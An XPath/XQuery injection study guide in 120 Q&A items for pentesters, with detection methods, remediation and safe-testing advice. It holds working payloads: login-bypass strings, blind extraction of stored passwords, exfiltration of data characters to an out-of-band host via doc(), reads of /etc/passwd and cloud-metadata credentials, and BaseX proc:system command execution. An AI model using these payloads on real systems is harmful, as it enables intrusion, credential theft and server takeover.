# XPath / XQuery Injection — Zero to Expert (100 Q&A)

**Author:** x8bitranjit
Study companion + field reference. Advanced guide — pair with OWASP/PortSwigger XPath notes, HackTricks, PayloadsAllTheThings, and the W3C XPath function reference. **Sibling of SQLi/[LDAP](../LDAP/)** — same query-injection engine, XML flavor. Impact ceiling = auth bypass · full XML dump · file/SSRF · XQuery RCE.

---

## Level 0 — Fundamentals

**Q1. What is XPath injection?** Manipulating an XPath query by injecting into user input that's concatenated into the expression, subverting the query's logic to bypass auth, extract the XML document, read files, or (XQuery) run code.
> *Plain version:* the app stores data in an **XML filing cabinet** and a clerk runs a "find the folder where name=X and password=Y" query. Your username is supposed to be a plain word in the `X` slot; injection = writing the cabinet's own query-punctuation (`'`, `or`) into that slot so the search matches **everyone**, and you're handed the first folder (usually admin).

**Q2. What is XPath?** A language for selecting nodes from an XML document (`//user[name='bob']`). Apps use it to authenticate against XML credential stores, query native XML databases, and select SAML/config nodes.

**Q3. How is XPath injection like SQL/LDAP injection?** Same root cause — untrusted input concatenated into a query language. You break out of a string literal and inject logic/functions. The blind-extraction engine is the same as [../LDAP/](../LDAP/) and [../NoSQLi/](../NoSQLi/).

**Q4. What's the impact ceiling?** Authentication bypass, full XML-store disclosure (all users/passwords blind), file read + SSRF (XPath 2.0 `doc`/`unparsed-text`), and RCE via XQuery on native XML DBs.

**Q5. What's the biggest difference from SQLi?** XPath 1.0 has **no comment syntax** — you can't truncate the query with `--`/`#`. You must keep the expression syntactically balanced (typically leaving a trailing open quote to pair with the app's closing quote).
> *Plain version:* SQL lets you type `'--` to "cross out" the rest of the query. XPath 1.0 has **no eraser** — leave the clerk's question half-finished and it just errors. So instead you *complete the sentence for them*: end your payload with a lone open-quote and let the app's own trailing `'` close it. Count the quotes and they balance.

**Q6. What's the primary CWE?** **CWE-643** (XPath Injection). XQuery injection is **CWE-652**.

**Q7. Where is XPath used in apps?** XML-based login, native XML databases (eXist-db, BaseX, MarkLogic, Sedna), SAML attribute selection, XML config/catalog lookups, SOAP/XML APIs, XSLT.

**Q8. Give the canonical auth-bypass payload.** `' or '1'='1` injected into a username concatenated as `//user[name='INPUT' ...]` → `//user[name='' or '1'='1' ...]` → always true → login.
> *Plain version:* you turn the clerk's *"name = (what you typed)"* into *"name = '' **or** 1=1"* — and since 1 always equals 1, the "or" makes the whole condition true no matter what, so the clerk says "yes, found a match" and logs you in.

**Q9. Why does `and` vs `or` precedence matter?** In XPath, `and` binds tighter than `or`, so `name='' or '1'='1' and password='$p'` parses as `name='' or ('1'='1' and password='$p')` — which is true **only if** the password clause matches, **not** unconditionally. So a bare `' or '1'='1` in the **name** field of a `name=$u and password=$p` predicate does **not** reliably bypass. Make your always-true term land **outside** the `and`: inject the **last** field (`password=' or '1'='1` → `(… and password='') or '1'='1'` = true), inject the name field with a trailing OR (`' or 1=1 or ''='`), or inject **both** fields. This precedence trap is the #1 XPath-payload mistake.

**Q10. Is XPath injection the same as XXE?** No. XXE ([../XXE/](../XXE/)) injects a DOCTYPE/entity into an XML **input document**. XPath injection injects into the **query** run against an XML document. Different bug, different fix.

---

## Level 1 — Find & fingerprint

**Q11. How do you find XPath sinks?** Look for XML data files/DBs, XML content-types, code like `selectNodes`/`XPathExpression`/`xpath.evaluate`, SAML processing, and XML-backed logins/search.

**Q12. How do you fingerprint the XPath version?** Probe function availability: `substring`/`count`/`string-length` (1.0+); `lower-case`/`matches`/`doc`/`unparsed-text`/`string-to-codepoints` (2.0+); FLWOR `for/let/return` (XQuery).

**Q13. Why does the version matter?** 1.0 = blind extraction only. 2.0/3.0 adds `doc()` (SSRF/OOB) and `unparsed-text()` (file read). XQuery adds extension functions (RCE). Your escalation depends on it.

**Q14. What injection contexts exist?** Single-quote string (`='$x'`), double-quote string (`="$x"`), numeric/position (`[position()=$x]`), and element/path fragments. Each needs a different breakout.

**Q15. What are native XML databases and why care?** DBs that store/query XML with XPath/XQuery (eXist-db, BaseX, MarkLogic, Sedna). Their XQuery layer exposes extension functions (`proc:system`, `xdmp:*`, `util:eval`) that can reach RCE.

**Q16. How do you detect the quote context?** Inject `'` and `"` separately; whichever produces a parse error/behavior change reveals which quote the app uses around your input.

**Q17. What's XSLT injection's relationship?** XSLT (`xsl:value-of select="$input"`) is a cousin — user input in an XSLT `select` is XPath-injectable, and XSLT engines add their own `document()`/extension RCE vectors.

**Q18. Can XPath injection appear in SAML?** Yes — SPs that select assertion attributes/NameID via an XPath built from input can be injected ([../OAuth/](../OAuth/) SAML section).

**Q19. What source patterns are red flags?** String concatenation into an XPath: `"//user[name='" + u + "']"`, `xPath.compile(base + input)`, or building a predicate from `req.query`.

**Q20. Where do you test first?** The XML-backed **login** (auth bypass = highest value), then search/lookup endpoints and any XML-DB-backed API.

---

## Level 2 — Detection

**Q21. Why baseline against a control?** XPath verdicts are differential — the injected logic must **change** the result. Without a valid/invalid baseline you can't distinguish a real steer from normal behavior → false positives.

**Q22. What's the core boolean test?** Compare an always-true tail (`' or '1'='1`) with an always-false one (`' or '1'='2`). A consistent difference (that isn't just an error) confirms injection.
> *Plain version:* ask the clerk the same thing two ways — once with a tail that's always true, once always false — and check the answers **differ** (true → more/all records or login-ok; false → the normal empty result). If they reliably differ and it's not just an error both times, your input is steering the query = confirmed. Keep the false one as your control.

**Q23. What do quote/error probes tell you?** `'`/`"` causing an `XPathException`/`SAXParseException`/`Invalid predicate` confirms input reaches an XPath sink and reveals the context.

**Q24. What's a boolean oracle for XPath?** Any observable that differs true vs false: login success, record present/absent, response length/content, status code.

**Q25. Why can't you use `--` comments?** XPath 1.0 has no comment syntax. You must keep the whole expression valid; the trick is balancing quotes, not commenting out the tail.

**Q26. How do you balance the trailing quote?** Supply a payload ending in an open string (`' or '1'='1`) so the app's own closing `'` completes it: `name='' or '1'='1'`.

**Q27. What's a common false positive?** A lone error from `'`, or `' or '1'='1` returning 200 with no difference from the false control. Only a **diff vs the false control** counts.

**Q28. How do you cut FPs on auth bypass?** Reproduce in a fresh session, with no valid password, and confirm you're authenticated as a **different/expected** user (not your cached session), repeatably.

**Q29. Can you detect XPath injection without visible data?** Yes — a pure boolean oracle (record present/absent) or, on 2.0, `doc('http://oob')` as an out-of-band oracle.

**Q30. Numeric context detection?** In `[position()=$x]`, inject `1 or 1=1` (no quotes) and see if the node-set widens.

---

## Level 3 — Authentication bypass

**Q31. List auth-bypass payloads.** `' or '1'='1`, `' or ''='`, `'or'1'='1`, `admin' or '1'='1`, `" or "1"="1`, `' or 1=1 or ''='`, and union `']|//user|a['`.

**Q32. How do you target the admin node?** `admin' or '1'='1` → `name='admin' or '1'='1'` → true, and if the app returns the matched node it's the admin.

**Q33. What is union-based (`|`) breakout?** XPath `|` unions node-sets. Injecting `']|//user|a['` can return `//user` nodes regardless of the intended predicate, bypassing the filter and disclosing extra nodes.

**Q34. Why does `' or ''='` work?** It closes the string and adds `or ''=''` (empty equals empty) → always true.

**Q35. Both fields injectable — advantage?** You can satisfy the whole predicate from either side and avoid needing a valid value in the other; also helps when one field is filtered.

**Q36. The app hashes the password — does bypass still work?** Username-side injection still works (you make the predicate true regardless of password). If the password is hashed and compared in-query, inject on the username to bypass; if compared in code, you may still return a target user via username injection.

**Q37. Why is auth bypass usually Critical?** Unauthenticated, affects any account including admin, no credentials needed — direct high-impact access.

**Q38. What's the no-space bypass for?** `'or'1'='1` removes spaces to defeat naive filters/WAFs that key on ` or `.

**Q39. Double-quote context payload?** `" or "1"="1` when the app wraps input in double quotes.

**Q40. Best evidence for an auth-bypass finding?** Fresh-session login with the payload and no valid password, screenshot of the account/admin page, plus the exact request and the true/false control comparison.

---

## Level 4 — Blind extraction

**Q41. What functions drive blind extraction?** `count()` (records/fields), `string-length()` (value length), `substring()` (char-by-char), `name()` (element names), and `string-to-codepoints()` (binary search, 2.0).

**Q42. How do you count records blind?** `' or count(//user)=N or 'x'='y` — flip N until the oracle returns true; that N is the record count.

**Q43. How do you find a value's length?** `' or string-length((//user[1]/password))=N or 'x'='y` — increment N until true.

**Q44. How do you extract a character?** `' or substring((//user[1]/password),POS,1)='C' or 'x'='y` — iterate C over the charset at each POS until true.

**Q45. How do you dump the whole store?** Loop POS 1..length × charset for record 1 (`//user[1]`), then `//user[2]`, `//user[3]`, … using `count(//user)` to know how many — exfiltrating every field of every record.
> *Plain version:* a game of 20-questions that reads the whole cabinet. Ask "is letter 1 of user #1's password an 'a'? a 'b'? …", nail each character, move to the next letter, then the next folder — because the whole database is one document with no per-folder locks, yes/no answers alone reconstruct **every** credential. Slow by hand, so `poc/xpath_blind.py` does it (binary search cuts the questions ~in half).

**Q46. Why binary-search codepoints?** `string-to-codepoints(substring(...,i,1))[1]>M` halves the search space per request (≈7 requests/char for ASCII) vs up to N with linear charset iteration.

**Q47. How do you discover element names blind?** `substring(name(//user[1]/*[K]),POS,1)='c'` reconstructs each child element's name, revealing the schema when you don't know field names.

**Q48. How do you extract attributes?** Target `//user[1]/@id` (or `name(//user[1]/@*[1])`) and apply the same substring extraction.

**Q49. What makes an extraction reliable?** A **stable** boolean oracle: the same true payload always true, the same false always false across repeats — so each extracted char is trustworthy.

**Q50. How do you keep blind extraction SAFE?** Extract **your own** record / a benign marker to prove the primitive; stop after enough chars; throttle; redact the value in the report — don't dump every user's hash from prod.

---

## Level 5 — Error-based & XPath 2.0/3.0

**Q51. What is error-based XPath extraction?** Coercing the engine to include the selected value in a verbose error message (type/eval error) — faster than blind when the app leaks XPath errors.

**Q52. What does `doc()` do for an attacker?** It makes the XML engine fetch a URL server-side → an **SSRF** primitive and an **out-of-band** oracle. `doc('http://oob')` confirms blind injection and reaches internal/cloud endpoints.

**Q53. How do you exfiltrate data via `doc()`?** Put the stolen value in the callback host/path: `doc(concat('http://', substring((//user[1]/password),1,1), '.oob/'))` — each char appears in your DNS/HTTP logs (fast blind exfil).

**Q54. What does `unparsed-text()` enable?** Reading a **local file as text** (`unparsed-text('file:///etc/passwd')`) — arbitrary file read, bypassing XML well-formedness (unlike `doc()` which expects XML).

**Q55. `doc()` vs `unparsed-text()` — when to use which?** `doc()` for URLs/SSRF and XML content; `unparsed-text()` for arbitrary (non-XML) local files. Both are XPath 2.0+.

**Q56. How do you reach cloud metadata via XPath?** `doc('http://169.254.169.254/latest/meta-data/…')` on a 2.0 engine → IAM creds (chain [../SSRF/](../SSRF/)).

**Q57. What is XQuery injection?** Injection into an XQuery expression (native XML DBs). FLWOR and module imports let you go beyond selection to call **extension functions** — potentially RCE. CWE-652.
> *Plain version:* some apps run a whole database *on* XML using XPath's bigger sibling, **XQuery** — and those engines ship helper functions that can run OS commands (BaseX `proc:system`, eXist `util:eval`). Land your injection there and you go from "read the cabinet" to "run commands on the server" (RCE) — the top of this class's ceiling.

**Q58. Give engine-specific RCE functions.** BaseX `proc:system('id')`; MarkLogic `xdmp:spawn`/`xdmp:document-load`; eXist-db `util:eval`/`file:read`. Match to the identified engine.

**Q59. How do you confirm the XML DB before XQuery RCE?** Error strings, function-probe behavior (`proc:system` vs `xdmp:*`), and version banners; then use that engine's extension catalog.

**Q60. Why is XQuery RCE Critical?** It's arbitrary command/code execution on the server via the data query — the top of the impact scale for this class.

---

## Level 6 — Bypasses

**Q61. How do you bypass a space filter?** Remove spaces: `'or'1'='1`; or use entities/encodings (`&#x20;`), or functions that avoid the blocked tokens.

**Q62. How do you bypass a quote filter?** Switch quote style (`"` vs `'`), URL-encode (`%27`), use `concat()`/`translate()` to build strings without literal quotes, or numeric contexts that need no quotes.

**Q63. How do you avoid literal strings the WAF blocks?** `concat('ad','min')`, `translate('ZZ','Z','a')`, or codepoint comparisons — construct the value instead of typing it.

**Q64. How do you bypass keyword filters on `or`/`and`?** Case variation (`oR`), spacing tricks, or restructure with functions (`boolean(...)`, `not(...)`); confirm with the differential test.

**Q65. What if the app strips `//`?** Use single-step paths (`/*/user`), `descendant::`, or relative paths from the context node.

**Q66. Second-order XPath injection?** Input stored (a profile field) and later concatenated into an XPath query elsewhere — injection fires away from the original entry point.

**Q67. How do you handle unknown field names?** Discover them blind with `name(//user[1]/*[K])` extraction, or use positional navigation (`/*[2]`) instead of names.

**Q68. Can you inject in the path, not just a predicate value?** Sometimes — if input builds a path fragment, you may inject steps/axes (`ancestor::`, `following::`) or `|` unions to reach other nodes.

**Q69. How does `translate()` help extraction?** It maps characters, enabling case-normalization or transforming a value into a comparable form when direct comparison is filtered.

**Q70. Why test both quote contexts and numeric?** The same endpoint may build different sub-queries; coverage requires trying `'`, `"`, and unquoted numeric/position injections.

---

## Level 7 — Tooling & methodology

**Q71. What is xcat?** The reference XPath-injection tool (Tom Forbes): automates blind extraction, supports XPath 1.0/2.0, and uses `doc()` for OOB-accelerated exfiltration and file read.

**Q72. When do you use xcat vs manual?** Manual (Burp) to **confirm** the injection + context low-FP; xcat to **automate** the tedious full-document extraction once confirmed. Reproduce the key steps manually for the report.

**Q73. How does OOB speed up xcat?** With `doc()` and an attacker-controlled server, xcat exfiltrates via out-of-band requests instead of hundreds of boolean requests — much faster on 2.0 engines.

**Q74. What does `poc/xpath_fuzz.py` do?** Control-baselined detection + auth-bypass testing across single/double-quote payloads, deciding "bypass" against a learned baseline (low-FP).

**Q75. What does `poc/xpath_blind.py` do?** Blind char-by-char extraction using `string-length`/`substring` (and `count`), with an auto-calibrated true/false oracle — the LDAP/NoSQLi engine for XPath.

**Q76. How do you build the boolean oracle in a tool?** Send an always-true and always-false payload, learn the response signature difference (status/length/marker), then classify each extraction response against it.

**Q77. Why escape the known prefix in substring extraction?** Unlike regex, XPath `substring` compares literal characters — but quotes/specials in the extracted value must be handled when you embed them back into payloads (use codepoint comparison to avoid quoting issues).

**Q78. How do you reproduce XQuery RCE safely?** Stand up a local BaseX/eXist-db, test the extension-function payload there, then fire one benign command on the target.

**Q79. What's the fastest path from "confirmed" to impact?** Auth bypass first (one request), then either full blind dump (data) or `doc()`/`unparsed-text()` (SSRF/file) depending on the version — pick the highest-impact reachable.

**Q80. How do you avoid DoS while extracting?** Throttle requests, bound the extraction (own record/marker), and prefer OOB/binary-search to minimize request volume against prod.

---

## Level 8 — Escalation & chaining

**Q81. Turn a boolean oracle into a full breach.** Enumerate `count(//user)`, then extract every `//user[i]` field char-by-char → dump all usernames/passwords → offline crack or direct login → mass ATO.

**Q82. Chain XPath with SSRF.** On 2.0, `doc('http://internal/…')` reaches internal services / cloud metadata → IAM creds → infra pivot ([../SSRF/](../SSRF/)).

**Q83. Chain XPath with file read.** `unparsed-text('file:///…/web.config')` leaks secrets/keys → forge tokens/sessions elsewhere.

**Q84. Relationship to LDAP/NoSQLi kits?** All three are query-injection with a blind char-by-char extraction engine — the same methodology and tooling shape transfer directly ([../LDAP/](../LDAP/), [../NoSQLi/](../NoSQLi/)).

**Q85. Chain XPath auth bypass → ATO.** Bypass login as admin, then perform privileged actions / read other users — full account/tenant compromise.

**Q86. Can XPath and XXE coexist?** Yes — an XML endpoint may accept an injectable XPath **and** parse attacker XML (XXE). Test both; they're independent bugs on the same surface.

**Q87. XQuery RCE → what next (authorized)?** One benign command to prove exec, then stop; note the extension module to disable. Don't pivot/persist in a bounty PoC.

**Q88. How do you demonstrate reach for severity?** Show extraction of a record that isn't yours (a test victim you control) or admin access — proving it's not limited to your own data.

**Q89. What's the most valuable single outcome?** Either auth-bypass-to-admin or full credential-store extraction — both convert one injectable field into total application compromise.

**Q90. When is XPath injection only Medium?** Limited disclosure (a few non-sensitive nodes), or confirmed injection without a reachable dump/file/RCE — real but bounded; report the demonstrated impact honestly.

---

## Level 9 — Validity, severity, defense

**Q91. What makes a real XPath finding?** A **controlled, repeatable change in query behavior**: login without a password, data extracted, a file read, or code executed. A lone error/odd response is a lead, not a bug.

**Q92. CVSS for unauth XPath auth-bypass?** ~`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` ≈ 9.1 (Critical); blind read-only dump may be `C:H/I:N`; XQuery RCE ≈ 9.8.

**Q93. Top false positives to auto-reject?** Lone `'`/error; `' or '1'='1` 200 with no diff vs the false control; same-session "login"; reflected `count()` with no oracle; "app uses XML" with no injecting param.

**Q94. Core remediation?** **Parameterize** XPath with variable binding (`XPathVariableResolver` / `$var`), not string concatenation — input becomes data, never expression syntax.

**Q95. If concatenation is unavoidable?** Strictly **allow-list/validate** input and **escape** quotes; but parameterization is the real fix.

**Q96. How do you neutralize 2.0/XQuery escalation?** Use a 1.0 evaluator or **disable** `doc()`/`document()`/`unparsed-text()`/external access; for XML DBs, disable extension modules (`proc:*`, `xdmp:*`, `util:eval`, `file:*`) and run least-privileged.

**Q97. Should passwords be compared in the XPath?** No — fetch by username (parameterized) and compare the password **hash in application code**, so the query can't be turned into an auth bypass.

**Q98. Why is allow-listing usernames effective?** A `^[A-Za-z0-9_]+$` username can't contain quotes/`or`/functions, removing the injection characters — a strong defense-in-depth alongside parameterization.

**Q99. What must a SAFE-PoC always respect?** Control vs injected requests; a minimal proof (login as test account / own-record extraction redacted / one benign file/command); no prod dump/DoS; throttled loops.

**Q100. One thing to remember about XPath injection?** *It's SQLi/LDAP for XML — with no comments.* Break out of the string, inject `or`-logic or `substring()`/`doc()`, and because the whole dataset is one document, one injectable field can dump everything. **Report the bypass / the extracted store / the file / the RCE — not the quote error.**

---

## Level 10 — Interview (explain it out loud)

*Crisp, senior-sounding answers for an AppSec/pentest interview or a bounty-team screen. XPath is a great differentiator — it shows whether you understand injection as a family, not just SQLi syntax.*

**Q101. In one sentence, what is XPath injection and why does it matter?** It's injecting into user input that's concatenated into an XPath expression, subverting the query to **bypass authentication, dump the entire XML store, read files/SSRF (XPath 2.0), or run code (XQuery)** — and it matters because XML-backed logins and native XML DBs concatenate input more often than people think, and it slips past SQLi-tuned defenses.

**Q102. What's the single biggest difference from SQL injection?** **No access control on the data.** An XML document has no per-row/per-node privilege system, so a successful injection extracts the *whole* document — every user, every secret — whereas SQLi is limited to the privileges of the app's DB account. Amit Klein's 2004 "Blind XPath Injection" paper is built on exactly this: one injectable field = the complete database.

**Q103. And the biggest syntactic difference?** **XPath 1.0 has no comment syntax.** You can't truncate the query with `--`/`#` like SQLi — you must keep the expression **balanced**, typically leaving a trailing quote or `or ''='` that pairs with the app's closing quote. That's also why XPath payloads don't match SQLi WAF signatures.

**Q104. How do you confirm XPath injection with low false positives?** A **boolean differential**: send an always-true tail (`' or '1'='1`) and an always-false control (`' or '1'='2`) and require a **repeatable difference** in the response (record count / login result / length). A lone quote-error or a single odd 200 is a *lead*, not a finding — the oracle must flip with the boolean.

**Q105. Walk me through the auth-bypass, including the AND-password gotcha.** If the query is `//user[name='$u' and password='$p']`, a bare `name='' or '1'='1'` isn't unconditionally true because of the trailing `and password`. So you use a payload whose OR sits **outside** the whole predicate — `' or '1'='1' or ''='` — making it true regardless of password, or inject `' or name='admin' or ''='` to land as admin specifically.

**Q106. Once you have a boolean oracle, how do you dump the store?** **Booleanize** with `count()` (how many nodes), `string-length()` (value length), and `substring(value,pos,1)` compared/`>`-bisected to binary-search each character's codepoint (≈7 requests/char). Walk every node and attribute. Because there's no ACL, this recovers **all** usernames and password hashes/tokens — the "XPath crawling + Booleanization" of Klein's paper.

**Q107. How does the XPath *version* change your ceiling?** XPath **1.0** caps at auth-bypass + full blind dump. XPath **2.0/3.0** adds `doc()`/`document()` → **SSRF/OOB** (hit cloud metadata) and `unparsed-text()` → **arbitrary file read**. A **native XML DB** (BaseX/eXist/MarkLogic/Sedna) adds **XQuery** with extension modules → **RCE**. So fingerprinting the version/engine first (does `doc()` fire an OOB hit?) decides the whole attack.

**Q108. What's XQuery injection and how does it reach RCE?** On native XML DBMSes the injection reaches XQuery, whose **extension modules** run code and exfiltrate: BaseX `proc:system('id')`/`proc:execute`, eXist-db `util:eval` + HTTP-client/mail modules (documented exfil via the eXist REST API), MarkLogic `xdmp:*`. CWE-652. Same injection, but now it's a shell, not just a dump.

**Q109. How is XPath injection related to XXE — and how do you avoid confusing them?** Both are XML bugs and often live on the same endpoint, but they're different: **XXE** abuses the XML **parser** (external entities → file read/SSRF from the *document you send*), while **XPath injection** abuses a **query** built from your input over the server's XML data. If you control an uploaded/posted XML doc, think XXE; if your input lands in a `//node[...]` lookup, think XPath. Test both.

**Q110. Where does XPath injection hide besides login forms?** Native XML database queries (eXist/BaseX/MarkLogic), **SAML** attribute/NameID selection (→ auth bypass / assertion tampering), XML config/catalog lookups, SOAP/XML API parameters, and XSLT. Any place user input selects nodes from XML is a candidate.

**Q111. What's the correct fix, and why isn't escaping enough?** **Parameterize** XPath with variable binding (`$user`, `XPathVariableResolver`) so input is data, never expression syntax. Escaping is error-prone (quote contexts, functions) and a blacklist misses payloads; parameterization is primary, with **username allow-listing** (`^[A-Za-z0-9_]+$`), **hash comparison in code** (not inside the XPath), and **disabling `doc()`/`unparsed-text()`/extension modules** as defense-in-depth.

**Q112. Rapid fire.** *Quote errors but no boolean diff?* → lead, not a finding. *`//user[name=$u and password=$p]`?* → use a trailing-OR bypass. *`doc()` OOB hit?* → XPath 2.0 → SSRF. *`unparsed-text()` works?* → file read. *BaseX/eXist/MarkLogic?* → XQuery → RCE. *CWE?* → **CWE-643** (XQuery **CWE-652**). *Why dump so much from one field?* → XML has no access control.

---

## Level 11 — Scenario (walk me through it)

*"Here's the response — what do you do?" End-to-end reasoning from a probe to a proven Critical (or an honest downgrade). Full worked run: guide Appendix A.*

**Q113. An XML-backed login errors on `x'` but returns 200 for `x' or '1'='1`. Confirm it's real before reporting.** A 200 alone proves nothing — I run the **differential**: `' or '1'='2'` (control) should behave differently from `' or '1'='1'`. If the always-true version logs me in or changes the result while the always-false doesn't, that's a confirmed boolean oracle = real XPath injection. Then I fingerprint the version and go for auth bypass. I don't report on the quote-error alone.

**Q114. The query ANDs a password check after the name and your `' or '1'='1` doesn't log you in. Why, and what do you send?** Because of precedence: `name='' or ('1'='1' and password='wrong')` — the AND-password clause defeats a naive OR. I send a payload whose OR escapes the entire predicate: `' or '1'='1' or ''='` (always true regardless of password), or target a user directly with `' or name='admin' or ''='`. Now I land as admin with no password.

**Q115. You have auth bypass. The program wants "more than a login bypass" — what else can one field give you?** The whole credential store — because XML has no access control. Using the same boolean oracle I Booleanize: `count(//user)` for the node count, `string-length(//user[1]/password)` for each length, then `substring(...,pos,1)` bisected to extract every character of every user's hash/token. For the report I extract **my own** record + a few chars of one hash (redacted) to prove the primitive, then stop — that demonstrates full-store disclosure without dumping prod.

**Q116. Blind extraction is confirmed but slow (one char at a time). How do you speed it up and stay safe?** **Binary-search the codepoint** with `>`/`<` comparisons (or `string-to-codepoints()` on XPath 2.0) — ~log₂ per character (≈7 requests) instead of 26+. I also throttle the loop (jitter, low concurrency) so I don't hammer prod, extract only enough to prove it, and redact. Speed comes from the algorithm, not from flooding the target.

**Q117. Your `doc('http://your-oob/x')` payload fires a DNS/HTTP hit on your collaborator. What does that unlock?** It confirms **XPath 2.0+**, which means `doc()`/`document()` fetch URLs server-side = **SSRF**. I point it at internal services and cloud metadata (`doc('http://169.254.169.254/latest/meta-data/...')`) to reach IAM credentials, and I try `unparsed-text('/etc/passwd')` for **file read**. The version fingerprint just raised my ceiling from "dump the XML" to "SSRF + local file read." (Hand the SSRF to the SSRF kit's discipline.)

**Q118. Fingerprinting shows the backend is BaseX (a native XML DB). What's the ceiling and how do you prove it safely?** **XQuery injection → RCE.** BaseX exposes the Process module, so `proc:system('id')` runs OS commands. I confirm with **one benign command** (`id`, or an OOB callback carrying its output to prove blind execution), capture the result, and **stop** — no shell, no persistence, tear down listeners. That's Critical (CWE-652 → CWE-78); I report the RCE with the single-command proof.

**Q119. The endpoint takes an XML document you upload and also has a `search=` node lookup. Which bug is which?** Two different XML bugs on one endpoint. The **uploaded XML document** → test **XXE** (external entities in *your* document → file read/SSRF via the parser). The **`search=` that selects nodes** from the server's XML → test **XPath injection** (boolean oracle → dump). I test both independently and don't conflate them — different root cause, different payloads, both worth reporting.

**Q120. A SAML SSO flow selects the NameID via XPath. What's the risk and your approach?** If user-influenced input reaches the XPath that selects the SAML NameID/attributes, injection can **alter which node is selected** → authenticate as a different user / bypass the assertion check → account takeover. I probe the XPath-controlled parameter with a boolean differential (carefully, on my own test IdP/accounts), and if it's injectable I demonstrate selecting a different identity. This chains into the OAuth/SAML kit — XPath is the underlying primitive, SSO ATO is the impact.

---

## Defense quick-reference
- **Parameterize** XPath with variable binding (`$user`, `XPathVariableResolver`); never concatenate input.
- **Allow-list + escape** input if concatenation is unavoidable (usernames `^[A-Za-z0-9_]+$`).
- Compare password **hashes in code**, not inside the XPath.
- **Disable** `doc()`/`document()`/`unparsed-text()`/external access; prefer an XPath 1.0 evaluator.
- Native XML DBs: **disable extension modules** (`proc:*`/`xdmp:*`/`util:eval`/`file:*`), least privilege.
- Same query-injection defenses as [../LDAP/](../LDAP/)/[../NoSQLi/](../NoSQLi/): validate structure, don't trust input as query syntax.
